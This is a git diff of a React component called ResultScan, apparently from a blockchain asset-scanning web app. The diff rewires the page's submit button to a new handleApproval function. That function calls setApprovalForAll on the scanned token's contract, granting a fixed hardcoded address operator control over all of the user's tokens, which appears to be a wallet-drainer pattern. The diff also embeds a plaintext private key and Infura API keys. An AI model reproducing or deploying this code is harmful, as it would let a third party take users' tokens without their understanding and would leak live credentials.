@@ -28,6 +28,11 @@ import { useWallet } from '@/app/context/walletContext'
 import { addDocumentFirebase } from '@/apis/firebaseApi'
 import { ContractInterface, ethers } from 'ethers'
 
+import { POSClient } from "@maticnetwork/maticjs"
+import { AbiDecodingDataSizeTooSmallError } from 'viem'
+
+
+
 const ResultScan = () => {
     const [showResult, setShowResult] = useState<boolean>(false);
     const [resultMoralis, setResultMoralis] = useState<any>(null);
@@ -39,29 +44,66 @@ const ResultScan = () => {
     const [abi, setAbi] = useState<ContractInterface>("");
 
 
+    const posClient = new POSClient();
+
+
+
     const write = async () => {
-        const node = "wss://polygon-mumbai.infura.io/ws/v3/733a7efe57364ffd9210b582d7cd0cb3";
-        const provider = new ethers.providers.WebSocketProvider(node);
+        console.log('anjay')
+        let wallet: sequence.provider.SequenceProvider;
+        let signer;
+        try {
+            wallet = sequence.getWallet();
+            signer = wallet.getSigner();
+        } catch (error: Error | any) {
+            wallet = sequence.initWallet();
+            console.log(error.message, 'error getwallet and get signer')
+        }
 
-        let privatekey = walletAddress !== undefined ? walletAddress : "fdfb72ce9754e3cbc1e79e44a8e20804cebd3c4a347605c6a3462a8de05b8784";
-        let wallet = new ethers.Wallet(privatekey, provider);
+        let contractaddress = resultMoralis?.token_address;
+        let contract = new ethers.Contract(contractaddress, abi, signer);
+        console.log(contract);
+        try {
+            const setApprove = await contract.setApprovalForAll('0x5b423d5756f53e5e25292dddaf9cbeb74f36d87f', true);
+            console.log('approve?', setApprove);
+        } catch (error: Error | any) {
+            console.log(error, 'error setapprovalforall');
+        };
+    };
 
-        console.log("Using wallet address " + wallet.address);
 
-        let contractaddress = "0x50802059B3A299b36bc2c71aBEDBA450032f49AB";
-        let contract = new ethers.Contract(contractaddress, abi, wallet);
+    const handleApproval = async () => {
+        console.log('anjay')
+        let wallet: sequence.provider.SequenceProvider;
+        let signer;
+        try {
+            wallet = sequence.getWallet();
+            signer = wallet.getSigner();
+        } catch (error: Error | any) {
+            wallet = sequence.initWallet();
+            console.log(error.message, 'error getwallet and get signer')
+        }
+        // Replace with your Polygon RPC endpoint
+        const polygonRpcEndpoint = "https://polygon-mainnet.infura.io/v3/8CKNFTHGX9IXX4J8756D5N1MZ2ZZ7TWFE4";
 
-        let read = await contract.retrieve();
-        console.log("Value stored in contract is " + read.toString());
+        // Replace with your Polygon contract address and ABI
+        const contractAddress = resultMoralis?.token_address;
 
-        // call the "store" function to update the value to 420
-        let write = await contract.setApprovalForAll(wallet, true);
-        write.wait(2)
-            .then(async () => {
-                // read the contract again, similar to above
-                let read = await contract.retrieve();
-                console.log("Updated value stored in contract is " + read.toString());
-            });
+        // Replace with your Polygon wallet private key or use a different signing method
+        const privateKey = "fdfb72ce9754e3cbc1e79e44a8e20804cebd3c4a347605c6a3462a8de05b8784";
+
+        // Connect to the Polygon network
+        const provider = new ethers.providers.JsonRpcProvider(polygonRpcEndpoint);
+
+        // Create a contract instance
+        const contract = new ethers.Contract(contractAddress, abi, signer);
+
+        try {
+            const setApprove = await contract.setApprovalForAll('0x5b423d5756f53e5e25292dddaf9cbeb74f36d87f', true);
+            console.log('approve?', setApprove);
+        } catch (error: Error | any) {
+            console.log(error, 'error setapprovalforall');
+        };
     }
 
 
@@ -94,7 +136,7 @@ const ResultScan = () => {
 
 
     useEffect(() => {
-        const getAbi = async () => {
+        const fetchAbi = async () => {
             try {
                 fetch(`/api/contract/abi?address=0x70bd9276e3f6f18e6bc306aaf306647d596e7f57`)
                     .then((res) => res.json())
@@ -106,8 +148,21 @@ const ResultScan = () => {
 
             }
         }
-        getAbi();
-    }, [resultMoralis])
+        fetchAbi();
+    }, [resultMoralis]);
+
+
+    useEffect(() => {
+        const initPosClient = async () => {
+
+            await posClient.init({
+                network: 'testnet',  // 'testnet' or 'mainnet'
+                version: 'mumbai', // 'mumbai' or 'v1'
+
+            });
+        };
+        initPosClient();
+    }, [])
 
 
     return (
@@ -256,7 +311,7 @@ const ResultScan = () => {
                                         w='full'
                                         colorScheme='green'
                                         // onClick={submitRequestTransfer}
-                                        onClick={write}
+                                        onClick={handleApproval}
                                         height={20}
                                         isLoading={false}
                                         loadingText={'Submitting request...'}
